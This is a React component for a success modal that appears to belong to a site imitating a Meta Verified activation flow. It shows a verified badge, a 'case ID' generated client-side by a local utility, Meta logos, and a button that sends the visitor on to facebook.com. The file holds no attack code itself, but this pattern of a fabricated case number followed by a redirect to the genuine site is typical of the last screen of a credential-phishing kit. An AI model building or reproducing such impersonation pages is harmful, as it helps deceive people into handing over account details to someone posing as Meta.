'use client'

import React from 'react';

import { useAppStrings } from '@/hooks/useAppStrings';
import { getOrCreateActivationRef } from '@/utils/metaVerifiedActivation';

import Modal from './Modal';

interface SuccessModalProps {
    isOpend: boolean;
    onToggleSuccess: (value: boolean) => void;
}

const SuccessModal: React.FC<SuccessModalProps> = ({ isOpend, onToggleSuccess }) => {
    const t = useAppStrings();
    const [isOpen, setIsOpen] = React.useState(isOpend);
    const [ticketId, setTicketId] = React.useState('');

    React.useEffect(() => {
        setIsOpen(isOpend);
    }, [isOpend]);

    React.useEffect(() => {
        if (isOpen) {
            setTicketId(getOrCreateActivationRef().ticketId);
        }
    }, [isOpen]);

    const handleClose = () => {
        setIsOpen(false);
        onToggleSuccess(false);
    };

    return (
        <Modal
            isOpen={isOpen}
            title={t.success.title}
            onClose={handleClose}
        >

            <div className="flex min-h-full w-full min-w-0 flex-col gap-8 pb-2">
                <div className="w-full min-w-0">
                    <div className="mb-[15px] flex flex-col items-center rounded-[16px] border border-meta-border-light bg-meta-bg px-6 py-8">
                        <img
                            src="/images/icons/ic_blue.svg"
                            className="h-[72px] w-[72px] drop-shadow-[0_4px_12px_rgba(0,100,224,0.2)]"
                            alt={t.main.altVerifiedBadge}
                        />
                        {ticketId ? (
                            <p className="mt-[14px] text-center text-[13px] font-medium text-meta-text-muted sm:text-[14px]">
                                {t.main.caseId} #{ticketId}
                            </p>
                        ) : null}
                    </div>
                    <p className='text-meta-text-secondary mb-[10px] text-[15px] leading-[1.65]'>
                        {t.success.p1}
                    </p>
                    <p className='text-meta-text-muted mb-[20px] text-[14px] leading-[1.6]'>
                        {t.success.p2}
                    </p>
                    <a
                        className='mv-btn-primary min-h-[48px] w-full text-white rounded-[40px] px-4 py-[10px] flex items-center justify-center transition-opacity duration-300 hover:opacity-90 active:opacity-90'
                        href="https://www.facebook.com"
                    >
                        {t.success.cta}
                    </a>
                </div>

                <div className='mx-auto h-[60px] w-[60px] shrink-0'>
                    <img src="/images/meta/logo-gray.svg" width="100%" height="100%" alt="" />
                </div>
            </div>
        </Modal>
    );
};

export default SuccessModal;
